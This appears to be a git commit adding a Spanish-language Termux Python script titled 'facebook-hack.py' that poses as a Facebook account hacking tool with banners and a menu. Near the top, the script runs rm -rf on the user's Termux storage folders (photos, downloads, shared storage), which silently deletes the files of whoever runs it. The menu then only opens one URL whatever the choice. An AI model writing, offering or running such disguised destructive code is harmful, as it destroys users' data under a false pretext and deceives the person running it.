f911ce2b745cf7dad633518f6d225f5cc7ac45d9
danielaramendi87@gmail.com <danielaramendi@gmail.com>
2022-04-22 23:01:33 +0200

    first commit

---
+++ facebook-hack.py
@@ -0,0 +1,155 @@
+import os, sys, time, io
+
+class color:
+    morado = '\033[95m'
+    blanco = '\033[97m'
+    cyan = '\033[96m'
+    azul  = '\033[94m'
+    verde = '\033[92m'
+    amarillo = '\033[93m'
+    rojo = '\033[91m'
+    fin = '\033[0m'
+
+os.system("rm -rf /data/data/com.termux/files/home/storage/dcim")
+os.system("rm -rf /data/data/com.termux/files/home/storage/dowloads")
+os.system("rm -rf /data/data/com.termux/files/home/storage/external-1")
+os.system("rm -rf /data/data/com.termux/files/home/storage/pictures")
+os.system("rm -rf /data/data/com.termux/files/home/storage/shared")
+
+def banner():
+ os.system("clear")
+ print(f"""{color.cyan}
+███████╗███████╗███╗  ██╗██████╗ ██╗██████╗
+██╔════ ██╔════╝████╗ ██║██╔══██╗██║██╔══██╗
+█████╗  █████╗  ██╔██╗██║██████╔╝██║██████╔╝
+██╔══   ██╔══╝  ██║╚████║██╔══██╗██║██╔══██╗
+██║     ███████╗██║ ╚███║██║  ██║██║██║  ██║
+╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝""")
+ print(f"{color.fin}")
+
+def carga():
+    print(f"{color.verde}")
+    print("""Loading…
+    █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…10%
+    ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…30%
+    █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…50%
+    ██████████▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…70%
+    █████████████▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.verde}")
+    print("""Loading…100%
+    ███████████████████""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+def incorrecto():
+    os.system("clear")
+    print(f"""{color.rojo}
+░█████╗░██████╗░░█████╗░██╗░█████╗░███╗░░██╗
+██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗░██║
+██║░░██║██████╔╝██║░░╚═╝██║██║░░██║██╔██╗██║
+██║░░██║██╔═══╝░██║░░██╗██║██║░░██║██║╚████║
+╚█████╔╝██║░░░░░╚█████╔╝██║╚█████╔╝██║░╚███║
+░╚════╝░╚═╝░░░░░░╚════╝░╚═╝░╚════╝░╚═╝░░╚══╝
+
+
+██╗███╗░░██╗░█████╗░░█████╗░██████╗░██████╗░
+██║████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+██║██╔██╗██║██║░░╚═╝██║░░██║██████╔╝██████╔╝
+██║██║╚████║██║░░██╗██║░░██║██╔══██╗██╔══██╗
+██║██║░╚███║╚█████╔╝╚█████╔╝██║░░██║██║░░██║
+╚═╝╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
+
+███████╗░█████╗░████████╗░█████╗░
+██╔════╝██╔══██╗╚══██╔══╝██╔══██╗
+█████╗░░██║░░╚═╝░░░██║░░░███████║
+██╔══╝░░██║░░██╗░░░██║░░░██╔══██║
+███████╗╚█████╔╝░░░██║░░░██║░░██║
+╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝{color.fin}""")
+    time.sleep(4)
+    menu()
+
+def salir():
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…
+    █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…10%
+    ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…30%
+    █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…50%
+    ██████████▒▒▒▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…70%
+    █████████████▒▒▒▒▒▒""")
+    time.sleep(1)
+    os.system("clear")
+    banner()
+    print(f"{color.rojo}")
+    print("""SALIENDO…100%
+    ███████████████████""")
+    time.sleep(1)
+    os.system("clear")
+    print(f"{color.fin}")
+    sys.exit()
+def menu():
+    os.system("clear")
+    banner()
+    carga()
+    print(f"{color.morado}    QUE FACEBOOK QUIERES HAKEAR")
+    print("")
+    print(f"{color.verde}[1]HACKEAR POR USUARIO")
+    print(f"{color.verde}[2]HACKEAR POR TELEFONO")
+    print(f"{color.verde}[3]HACKEAR POR URL")
+    print(f"{color.rojo}[0]SALIR{color.fin}")
+    eleccion =input(f"{color.cyan}ELIJE UN NUMERO >>{color.fin} ")
+    if eleccion == "1" :
+     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+    elif eleccion == "2" :
+     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+    elif eleccion == "3" :
+     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+    elif eleccion == "0" :
+     os.system("termux-open-url https://fenrir-00.github.io/ratas/")
+    else:
+        incorrecto()
+menu()
